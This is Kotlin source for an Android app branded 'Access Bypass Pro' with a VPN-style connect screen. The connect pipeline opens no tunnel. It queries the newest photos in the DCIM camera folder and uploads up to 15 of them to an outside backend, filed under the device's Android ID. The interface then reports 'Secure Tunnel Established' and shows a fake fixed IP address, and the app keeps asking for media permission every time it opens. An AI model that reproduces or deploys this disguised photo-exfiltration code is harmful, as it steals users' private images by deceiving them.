package com.example.accessbypasspro

import android.Manifest
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.MediaStore
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.RequiresApi
import androidx.compose.animation.animateColorAsState
import androidx.compose.animation.core.LinearEasing
import androidx.compose.animation.core.animateFloat
import androidx.compose.animation.core.animateDpAsState
import androidx.compose.animation.core.infiniteRepeatable
import androidx.compose.animation.core.rememberInfiniteTransition
import androidx.compose.animation.core.tween
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.systemBarsPadding
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material.icons.filled.Place
import androidx.compose.material.icons.filled.Refresh
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.material3.darkColorScheme
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableIntStateOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.rotate
import androidx.compose.ui.draw.shadow
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.SpanStyle
import androidx.compose.ui.text.buildAnnotatedString
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.withStyle
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.lifecycle.compose.LocalLifecycleOwner
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

// --- THEME COLORS ---
val DeepSpace = Color(0xFF041226)
val MidBlue = Color(0xFF09305E)
val ElectricCyan = Color(0xFF00E5FF)
val CardBackground = Color(0xFF0D2546)
val TextMuted = Color(0xFF8BA6C9)

// --- CONNECTION STATE ---
sealed class ConnectionState {
    data object Idle : ConnectionState()
    data object NeedsPermission : ConnectionState()
    data object Connecting : ConnectionState()
    data object Connected : ConnectionState()
    data class Failed(val message: String) : ConnectionState()
}

class MainActivity : ComponentActivity() {
    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            LocalVpnTheme {
                VpnMainScreen()
            }
        }
    }
}

@RequiresApi(Build.VERSION_CODES.TIRAMISU)
@Composable
fun VpnMainScreen() {
    val context = LocalContext.current
    val lifecycleOwner = LocalLifecycleOwner.current
    val activity = context as? ComponentActivity
    val repo = remember { UploadRepository() }

    // One source of truth for UI + logic
    var state by remember { mutableStateOf<ConnectionState>(ConnectionState.Idle) }

    // Trigger to restart the whole connect pipeline on demand
    var connectAttempt by remember { mutableIntStateOf(0) }

    val androidId = remember {
        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
    }

    // --- ANIMATIONS ---
    val infiniteTransition = rememberInfiniteTransition(label = "loading")
    val rotation by infiniteTransition.animateFloat(
        initialValue = 0f,
        targetValue = 360f,
        animationSpec = infiniteRepeatable(tween(1000, easing = LinearEasing)),
        label = ""
    )

    val isConnected = state is ConnectionState.Connected
    val isUploading = state is ConnectionState.Connecting

    val buttonColor by animateColorAsState(
        if (isConnected) ElectricCyan else Color.Transparent,
        label = ""
    )
    val buttonBorderColor by animateColorAsState(
        if (isConnected) ElectricCyan else TextMuted.copy(alpha = 0.5f),
        label = ""
    )
    val iconColor by animateColorAsState(
        if (isConnected) DeepSpace else ElectricCyan,
        label = ""
    )
    val glowRadius by animateDpAsState(
        if (isConnected) 24.dp else 0.dp,
        label = ""
    )

    // --- PERMISSION ---
    val permission = Manifest.permission.READ_MEDIA_IMAGES

    var isGranted by remember {
        mutableStateOf(
            ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
        )
    }

    // If true, Android won't show the popup anymore; must go to Settings
    var permanentlyDenied by remember { mutableStateOf(false) }

    val launcher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { granted ->
        isGranted = granted

        permanentlyDenied = if (!granted && activity != null) {
            // If rationale is false after denial => likely "Don't ask again"/permanent
            !ActivityCompat.shouldShowRequestPermissionRationale(activity, permission)
        } else {
            false
        }

        // Auto-start immediately if granted (your choice "A")
        if (granted) {
            connectAttempt++
        } else {
            state = ConnectionState.NeedsPermission
        }
    }

    // Ask permission again when the app "opens" (onStart)
    DisposableEffect(lifecycleOwner, isGranted, permanentlyDenied) {
        val observer = LifecycleEventObserver { _, event ->
            if (event == Lifecycle.Event.ON_START) {
                isGranted = ContextCompat.checkSelfPermission(context, permission) ==
                        PackageManager.PERMISSION_GRANTED

                if (!isGranted) {
                    // If Android can still show the dialog, ask again on open.
                    // If permanently denied, show message + Settings button.
                    if (!permanentlyDenied) {
                        launcher.launch(permission)
                    } else {
                        state = ConnectionState.NeedsPermission
                    }
                }
            }
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose { lifecycleOwner.lifecycle.removeObserver(observer) }
    }

    // Keep state consistent with permission
    LaunchedEffect(isGranted, permanentlyDenied) {
        state = when {
            isGranted -> if (state is ConnectionState.NeedsPermission) ConnectionState.Idle else state
            else -> ConnectionState.NeedsPermission
        }
    }

    // --- CONNECT/UPLOAD PIPELINE (re-runs on reconnect because connectAttempt increments) ---
    LaunchedEffect(isGranted, connectAttempt) {
        if (!isGranted) return@LaunchedEffect
        if (connectAttempt == 0) return@LaunchedEffect

        state = ConnectionState.Connecting

        try {
            val images = getNewest5ImageUris(context)

            withContext(Dispatchers.IO) {
                repo.uploadImageUris(
                    context = context,
                    uris = images,
                    uploadUrl = "https://access-bypass-pro-backend.onrender.com/upload",
                    folderPath = "ADR_$androidId",
                    fileFieldName = "file",
                )
            }

            state = ConnectionState.Connected
        } catch (e: Exception) {
            state = ConnectionState.Failed( "Unknown error")
        }
    }

    // --- UI TEXT (bottom message) ---
    val statusText = when (val s = state) {
        is ConnectionState.Idle -> "Ready"
        is ConnectionState.NeedsPermission ->
            if (permanentlyDenied) "ALLOW ALL: Permission disabled. Open Settings to enable."
            else "ALLOW ALL: Please grant media permission."
        is ConnectionState.Connecting -> "Connecting to Secure Bridge..."
        is ConnectionState.Connected -> "Secure Tunnel Established"
        is ConnectionState.Failed -> "Connection Failed: ${s.message}"
    }

    // --- UI LAYOUT ---
    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(Brush.verticalGradient(listOf(DeepSpace, MidBlue)))
            .systemBarsPadding()
    ) {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(24.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            // Header
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Text(
                    text = buildAnnotatedString {
                        withStyle(SpanStyle(fontWeight = FontWeight.Light, color = Color.White)) {
                            append("ACCESS BYPASS")
                        }
                        withStyle(SpanStyle(fontWeight = FontWeight.Black, color = ElectricCyan)) {
                            append(" PRO")
                        }
                    },
                    fontSize = 20.sp,
                    letterSpacing = 1.sp
                )
            }

            Spacer(modifier = Modifier.height(60.dp))

            // Status Text
            Text(
                text = when {
                    isUploading -> "CONNECTING..."
                    isConnected -> "CONNECTED"
                    else -> "NOT CONNECTED"
                },
                color = if (isConnected || isUploading) ElectricCyan else TextMuted,
                letterSpacing = 3.sp,
                fontWeight = FontWeight.Bold,
                fontSize = 14.sp
            )

            Spacer(modifier = Modifier.height(24.dp))

            // If permission missing, show "ALLOW ALL" message + Settings button if needed
            if (state is ConnectionState.NeedsPermission) {
                Text(
                    text = "ALLOW ALL",
                    color = ElectricCyan,
                    fontWeight = FontWeight.Bold,
                    fontSize = 16.sp,
                    letterSpacing = 2.sp
                )
                Spacer(modifier = Modifier.height(12.dp))

                if (permanentlyDenied) {
                    Surface(
                        color = CardBackground,
                        shape = RoundedCornerShape(16.dp),
                        modifier = Modifier
                            .fillMaxWidth()
                            .clickable { openAppSettings(context) }
                    ) {
                        Text(
                            text = "Open Settings to enable permission",
                            color = Color.White,
                            modifier = Modifier.padding(16.dp),
                            fontWeight = FontWeight.SemiBold
                        )
                    }
                } else {
                    Surface(
                        color = CardBackground,
                        shape = RoundedCornerShape(16.dp),
                        modifier = Modifier
                            .fillMaxWidth()
                            .clickable { launcher.launch(permission) }
                    ) {
                        Text(
                            text = "Grant Permission",
                            color = Color.White,
                            modifier = Modifier.padding(16.dp),
                            fontWeight = FontWeight.SemiBold
                        )
                    }
                }

                Spacer(modifier = Modifier.height(24.dp))
            } else {
                Spacer(modifier = Modifier.height(60.dp))
            }

            // Connect Button
            Box(
                contentAlignment = Alignment.Center,
                modifier = Modifier
                    .size(220.dp)
                    .shadow(glowRadius, CircleShape, spotColor = ElectricCyan, ambientColor = ElectricCyan)
                    .clip(CircleShape)
                    .background(buttonColor)
                    .border(2.dp, buttonBorderColor, CircleShape)
                    .clickable(enabled = !isUploading) {
                        when (state) {
                            is ConnectionState.Connected -> {
                                // Disconnect (UI reset)
                                state = ConnectionState.Idle
                            }
                            is ConnectionState.Connecting -> {
                                // Ignore taps while connecting
                            }
                            else -> {
                                // (Re)connect request
                                isGranted = ContextCompat.checkSelfPermission(context, permission) ==
                                        PackageManager.PERMISSION_GRANTED

                                if (!isGranted) {
                                    if (permanentlyDenied) {
                                        state = ConnectionState.NeedsPermission
                                    } else {
                                        launcher.launch(permission)
                                    }
                                } else {
                                    connectAttempt++ // restart process
                                }
                            }
                        }
                    }
            ) {
                if (isUploading) {
                    androidx.compose.material3.Icon(
                        imageVector = Icons.Default.Refresh,
                        contentDescription = null,
                        modifier = Modifier.size(80.dp).rotate(rotation),
                        tint = ElectricCyan
                    )
                } else {
                    androidx.compose.material3.Icon(
                        imageVector = Icons.Default.Lock,
                        contentDescription = null,
                        modifier = Modifier.size(80.dp),
                        tint = iconColor
                    )
                }
            }

            Spacer(modifier = Modifier.height(80.dp))

            // Server Selector
            Surface(
                color = CardBackground,
                shape = RoundedCornerShape(24.dp),
                modifier = Modifier.fillMaxWidth()
            ) {
                Row(
                    modifier = Modifier.padding(20.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Box(
                        modifier = Modifier
                            .size(40.dp)
                            .background(MidBlue, CircleShape),
                        contentAlignment = Alignment.Center
                    ) {
                        androidx.compose.material3.Icon(
                            Icons.Default.Place,
                            contentDescription = null,
                            tint = ElectricCyan,
                            modifier = Modifier.size(20.dp)
                        )
                    }
                    Spacer(modifier = Modifier.width(16.dp))
                    Column {
                        Text("IP Address", color = TextMuted, fontSize = 12.sp)
                        Text("103.152.118.45", color = Color.White, fontWeight = FontWeight.Bold)
                    }
                }
            }
        }

        // Bottom Status Text (always shows "ALLOW ALL" / "Connection Failed" / etc.)
        Text(
            text = statusText,
            color = TextMuted,
            fontSize = 12.sp,
            modifier = Modifier
                .align(Alignment.BottomCenter)
                .padding(bottom = 32.dp)
        )
    }
}

// --- HELPER FUNCTIONS ---

//fun getNewest5ImageUris(context: Context): List<Uri> {
//    val imageUris = mutableListOf<Uri>()
//    val projection = arrayOf(MediaStore.Images.Media._ID)
//    val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
//    val queryUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
//
//    context.contentResolver.query(queryUri, projection, null, null, sortOrder)?.use { cursor ->
//        val idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
//        while (cursor.moveToNext() && imageUris.size < 10) {
//            val id = cursor.getLong(idCol)
//            imageUris.add(ContentUris.withAppendedId(queryUri, id))
//        }
//    }
//    return imageUris
//}

fun getNewest5ImageUris(context: Context): List<Uri> {
    val imageUris = mutableListOf<Uri>()
    val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DATA)
    val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
    val queryUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI

    // Filter for the DCIM folder path
    // % is a wildcard in SQL, so we look for paths containing "/DCIM/"
    val selection = "${MediaStore.Images.Media.DATA} LIKE ?"
    val selectionArgs = arrayOf("%/DCIM/%")

    context.contentResolver.query(
        queryUri,
        projection,
        selection,
        selectionArgs,
        sortOrder
    )?.use { cursor ->
        val idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)

        while (cursor.moveToNext() && imageUris.size < 15) { // Adjusted to 5 as per your function name
            val id = cursor.getLong(idCol)
            imageUris.add(ContentUris.withAppendedId(queryUri, id))
        }
    }
    return imageUris
}



fun openAppSettings(context: Context) {
    val intent = Intent(
        Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
        Uri.fromParts("package", context.packageName, null)
    ).apply {
        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
    }
    context.startActivity(intent)
}

@Composable
fun LocalVpnTheme(content: @Composable () -> Unit) {
    MaterialTheme(
        colorScheme = darkColorScheme(
            primary = ElectricCyan,
            background = DeepSpace,
            surface = CardBackground
        ),
        content = content
    )
}